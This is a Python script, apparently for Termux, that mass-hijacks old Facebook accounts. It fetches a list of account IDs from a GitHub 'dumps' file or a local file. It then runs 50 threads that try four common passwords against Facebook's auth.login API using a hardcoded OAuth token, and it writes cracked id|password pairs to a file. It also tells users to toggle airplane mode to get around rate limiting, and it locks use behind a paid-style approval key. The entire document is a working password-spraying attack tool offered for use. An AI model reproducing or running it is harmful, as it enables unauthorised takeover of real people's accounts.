import os, time, sys, requests, uuid, random
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#--- [ COLORS ] ---#
G = '\033[1;92m' 
Y = '\033[1;93m' 
W = '\033[1;97m' 
R = '\033[1;91m'
S = '\033[1;96m'

loop, oks = 0, []

#--- [ APPROVAL SYSTEM ] ---#
def approval():
    os.system('clear')
    # ইউনিক আইডি জেনারেট
    user_id = os.getlogin().upper()
    unique = str(uuid.getnode())[:5]
    key = f"SHAHIN-OLD-{user_id}-{unique}"
    
    # আপনার গিটহাব লিঙ্ক
    approval_url = "https://raw.githubusercontent.com/w8Shahin/Approval-control/main/Keys.txt"
    
    print(f"{S} [•] SHAHIN BIN AHMED - OLD ID AUTO CLONE")
    print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    try:
        active_keys = requests.get(approval_url).text
        if key in active_keys:
            print(f" {G}[√] ACCESS GRANTED! STARTING AUTO CLONE...")
            time.sleep(2)
            Main()
        else:
            print(f" {R}[×] STATUS : NOT APPROVED")
            print(f" {W}[•] YOUR KEY : {G}{key}")
            print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f" {Y}[!] এই কী-টি কপি করে এডমিনকে পাঠান।")
            input(f"\n {G}[ENTER] TO MESSAGE ADMIN...")
            os.system(f'termux-open-url "https://wa.me/+8801XXXXXXXXX?text=Approve%20My%20Old%20Clone%20Key:%20{key}"')
            sys.exit()
    except:
        print(f" {R}[!] Network Error! Check Internet Connection."); sys.exit()

#--- [ LOGO ] ---#
def logo():
    os.system('clear')
    print(f'''{G}
 ███████ ██   ██  █████  ██   ██ ██ ███    ██ 
 ██      ██   ██ ██   ██ ██   ██ ██ ████   ██ 
 ███████ ███████ ███████ ███████ ██ ██ ██  ██ 
      ██ ██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
 ███████ ██   ██ ██   ██ ██   ██ ██ ██   ████ {Y}V-ULTRA{W}''')
    print(f" ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f" {W}[{G}•{W}] OWNER    : {G}SHAHIN BIN AHMED")
    print(f" {W}[{G}•{W}] TARGET   : {Y}OLD ACTIVE ID (2004-2011)")
    print(f" {W}[{G}•{W}] STATUS   : {G}AUTO CLONING ENABLED")
    print(f" ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

#--- [ MAIN MENU ] ---#
def Main():
    logo()
    print(f' {G}[1]{W} AUTO CLONE OLD ACTIVE IDS (DUMP FROM CLOUD)')
    print(f' {G}[2]{W} CLONE FROM YOUR LOCAL FILE')
    print(f' {G}[0]{W} EXIT')
    line()
    opt = input(f' {W}[•] CHOOSE : {G}')
    
    if opt == '1':
        auto_dump_clone()
    elif opt == '2':
        file_crack()
    else:
        sys.exit()

def line():
    print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

#--- [ AUTO CLONE METHOD ] ---#
def auto_dump_clone():
    logo()
    print(f" {W}[•] Fetching Fresh Old IDs from Cloud Server...")
    # এটি একটি পাবলিক ওল্ড আইডি ডাম্প লিঙ্ক (আপনি চাইলে পরিবর্তন করতে পারেন)
    url = "https://raw.githubusercontent.com/Social-Engineer-Tool/dumps/main/bd_old_ids.txt"
    try:
        data = requests.get(url).text
        with open('auto_dump.txt', 'w') as f:
            f.write(data)
        start_cloning('auto_dump.txt')
    except:
        print(f" {R}[!] Failed to fetch IDs!"); time.sleep(2); Main()

def file_crack():
    logo()
    path = input(f" {W}[+] ENTER FILE PATH : {G}")
    if os.path.exists(path):
        start_cloning(path)
    else:
        print(f" {R}[!] File Not Found!"); time.sleep(2); Main()

#--- [ CORE ENGINE ] ---#
def start_cloning(file_path):
    try:
        ids = open(file_path, 'r').read().splitlines()
    except:
        print(f" {R}[!] Error Reading File!"); exit()
    
    logo()
    print(f" {W}[•] TOTAL TARGET : {G}{len(ids)}")
    print(f" {W}[•] PASSWORDS    : {Y}123456, 1234567, 12345678, 123456789")
    print(f" {W}[•] IF NO OK, CHANGE AIRPLANE MODE FOR 5 SEC")
    line()
    
    with ThreadPool(max_workers=50) as engine:
        for user in ids:
            uid = user.split('|')[0]
            # আপনার দেওয়া গোল্ডেন পাসওয়ার্ড লিস্ট
            pws = ['123456', '1234567', '12345678', '123456789']
            engine.submit(crack, uid, pws, len(ids))

def crack(uid, pws, limit):
    global loop, oks
    # ওল্ড আইডির জন্য শক্তিশালী ইউজার এজেন্ট
    ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    
    for pw in pws:
        session = requests.Session()
        headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        }
        data = {'email': uid, 'password': pw, 'format': 'json'}
        try:
            res = session.post('https://b-api.facebook.com/method/auth.login', data=data, headers=headers).json()
            if 'session_key' in res:
                print(f'\r\r{G} [SHAHIN-OK💚] {uid} | {pw}{W}')
                oks.append(uid)
                open('/sdcard/SHAHIN-OLD-OK.txt', 'a').write(uid+'|'+pw+'\n')
                break
            elif 'checkpoint' in str(res):
                # ওল্ড আইডির ক্ষেত্রে সিপি আমরা সাধারণত ইগনোর করি
                break
        except:
            pass
            
    loop += 1
    sys.stdout.write(f'\r\r {W}[SCANNING] {loop}/{limit} OK:{G}{len(oks)}{W}'); sys.stdout.flush()

if __name__ == "__main__":
    approval()
